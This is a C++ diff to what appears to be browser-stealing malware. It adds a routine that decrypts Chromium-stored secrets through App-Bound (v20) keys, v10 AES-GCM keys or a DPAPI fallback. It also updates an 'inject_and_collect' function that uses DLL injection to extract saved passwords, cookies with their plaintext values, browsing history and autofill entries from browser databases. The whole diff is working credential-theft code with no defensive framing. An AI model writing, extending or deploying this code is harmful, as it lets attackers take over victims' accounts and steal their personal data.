@@ -111,6 +111,7 @@ std::string ensure_utf8(const std::string& input) {
 }
 
 std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
+    if (data.empty()) return {};
     DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
     DATA_BLOB output = { 0, nullptr };
     if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
@@ -122,7 +123,7 @@ std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data)
 }
 
 std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
-    if (data.size() < 15) return {};
+    if (key.empty() || data.size() < 15) return {};
     BCRYPT_ALG_HANDLE h_alg = nullptr;
     BCRYPT_KEY_HANDLE h_key = nullptr;
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
@@ -132,13 +133,16 @@ std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key
     if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
     if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
     if (BCryptGenerateSymmetricKey(h_alg, &h_key, nullptr, 0, (BYTE*)key.data(), (DWORD)key.size(), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
+
     std::vector<unsigned char> nonce(data.begin() + 3, data.begin() + 15);
     std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
     std::vector<unsigned char> tag(data.end() - 16, data.end());
+
     info.pbNonce = nonce.data();
     info.cbNonce = (DWORD)nonce.size();
     info.pbTag = tag.data();
     info.cbTag = (DWORD)tag.size();
+
     std::vector<unsigned char> plaintext(ciphertext.size());
     DWORD cb_plain = 0;
     if (BCryptDecrypt(h_key, ciphertext.data(), (DWORD)ciphertext.size(), &info, nullptr, 0, plaintext.data(), (DWORD)plaintext.size(), &cb_plain, 0) != 0) {
@@ -150,6 +154,35 @@ std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key
     BCryptCloseAlgorithmProvider(h_alg, 0);
     plaintext.resize(cb_plain);
     return plaintext;
+}
+
+std::string decrypt_browser_data(const std::vector<unsigned char>& enc_data, const std::vector<unsigned char>& v10_key, const std::vector<unsigned char>& v20_key) {
+    if (enc_data.empty()) return "";
+
+    // 1. App-Bound Encryption (v20)
+    if (enc_data.size() > 3 && enc_data[0] == 'v' && enc_data[1] == '2' && enc_data[2] == '0') {
+        if (!v20_key.empty()) {
+            auto dec = aes_gcm_decrypt(v20_key, enc_data);
+            if (!dec.empty()) {
+                if (dec.size() >= 32) dec.erase(dec.begin(), dec.begin() + 32);
+                return to_utf8_lossy(dec);
+            }
+        }
+    }
+
+    // 2. Standard AES-GCM (v10)
+    if (enc_data.size() > 3 && enc_data[0] == 'v' && enc_data[1] == '1' && enc_data[2] == '0') {
+        if (!v10_key.empty()) {
+            auto dec = aes_gcm_decrypt(v10_key, enc_data);
+            if (!dec.empty()) return to_utf8_lossy(dec);
+        }
+    }
+
+    // 3. DPAPI Fallback
+    auto dpapi_dec = decrypt_dpapi(enc_data);
+    if (!dpapi_dec.empty()) return to_utf8_lossy(dpapi_dec);
+
+    return "";
 }
 
 std::string wstring_to_utf8(const std::wstring& wstr) {
@@ -424,15 +457,12 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                             int pass_len = sqlite3_column_bytes(stmt, 2);
                             if (pass_blob && pass_len > 0) {
                                 std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);
-                                bool is_v2x = (enc_pass.size() > 3 && enc_pass[0] == 'v' && enc_pass[1] == '2');
-                                auto& key = is_v2x ? v20_key : v10_key;
-                                if (!key.empty()) {
-                                    auto dec = aes_gcm_decrypt(key, enc_pass);
-                                    if (!dec.empty()) {
-                                        if (is_v2x && dec.size() >= 32) dec.erase(dec.begin(), dec.begin() + 32);
-                                        p_data.passwords.push_back({ t_url ? t_url : "", t_user ? t_user : "", to_utf8_lossy(dec) });
-                                    }
+                                std::string dec_pass = decrypt_browser_data(enc_pass, v10_key, v20_key);
+                                if (!dec_pass.empty()) {
+                                    p_data.passwords.push_back({ ensure_utf8(t_url ? t_url : ""), ensure_utf8(t_user ? t_user : ""), dec_pass });
                                 }
+                            } else if (t_user && t_user[0] != '\0') {
+                                p_data.passwords.push_back({ ensure_utf8(t_url ? t_url : ""), ensure_utf8(t_user), "" });
                             }
                         }
                         sqlite3_finalize(stmt);
@@ -450,28 +480,31 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                 sqlite3* db;
                 if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                     sqlite3_stmt* stmt;
-                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
+                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                         while (sqlite3_step(stmt) == SQLITE_ROW) {
                             const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
                             const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
-                            const char* t_path = (const char*)sqlite3_column_text(stmt, 2);
-                            long long expires = sqlite3_column_int64(stmt, 3);
-                            int secure = sqlite3_column_int(stmt, 4);
-                            int httponly = sqlite3_column_int(stmt, 5);
-                            int samesite = sqlite3_column_int(stmt, 6);
-                            const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 7);
-                            int enc_len = sqlite3_column_bytes(stmt, 7);
+                            const char* t_val_plain = (const char*)sqlite3_column_text(stmt, 2);
+                            const char* t_path = (const char*)sqlite3_column_text(stmt, 3);
+                            long long expires = sqlite3_column_int64(stmt, 4);
+                            int secure = sqlite3_column_int(stmt, 5);
+                            int httponly = sqlite3_column_int(stmt, 6);
+                            int samesite = sqlite3_column_int(stmt, 7);
+                            const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 8);
+                            int enc_len = sqlite3_column_bytes(stmt, 8);
+
+                            std::string final_val;
                             if (enc_blob && enc_len > 0) {
                                 std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
-                                bool is_v2x = (enc_val.size() > 3 && enc_val[0] == 'v' && enc_val[1] == '2');
-                                auto& key = is_v2x ? v20_key : v10_key;
-                                if (!key.empty()) {
-                                    auto dec = aes_gcm_decrypt(key, enc_val);
-                                    if (!dec.empty()) {
-                                        if (is_v2x && dec.size() >= 32) dec.erase(dec.begin(), dec.begin() + 32);
-                                        p_data.cookies.push_back({ t_host ? t_host : "", t_name ? t_name : "", to_utf8_lossy(dec), t_path ? t_path : "", expires, secure, httponly, samesite });
-                                    }
-                                }
+                                final_val = decrypt_browser_data(enc_val, v10_key, v20_key);
+                            }
+
+                            if (final_val.empty() && t_val_plain && t_val_plain[0] != '\0') {
+                                final_val = ensure_utf8(t_val_plain);
+                            }
+
+                            if (!final_val.empty()) {
+                                p_data.cookies.push_back({ ensure_utf8(t_host ? t_host : ""), ensure_utf8(t_name ? t_name : ""), final_val, ensure_utf8(t_path ? t_path : ""), expires, secure, httponly, samesite });
                             }
                         }
                         sqlite3_finalize(stmt);
@@ -492,7 +525,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                         while (sqlite3_step(stmt) == SQLITE_ROW) {
                             const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
                             const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
-                            p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
+                            p_data.history.push_back({ ensure_utf8(t_url ? t_url : ""), ensure_utf8(t_title ? t_title : ""), sqlite3_column_int(stmt, 2) });
                         }
                         sqlite3_finalize(stmt);
                     }
@@ -512,7 +545,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                         while (sqlite3_step(stmt) == SQLITE_ROW) {
                             const char* t_name = (const char*)sqlite3_column_text(stmt, 0);
                             const char* t_val = (const char*)sqlite3_column_text(stmt, 1);
-                            p_data.autofill.push_back({ t_name ? t_name : "", t_val ? t_val : "" });
+                            p_data.autofill.push_back({ ensure_utf8(t_name ? t_name : ""), ensure_utf8(t_val ? t_val : "") });
                         }
                         sqlite3_finalize(stmt);
                     }
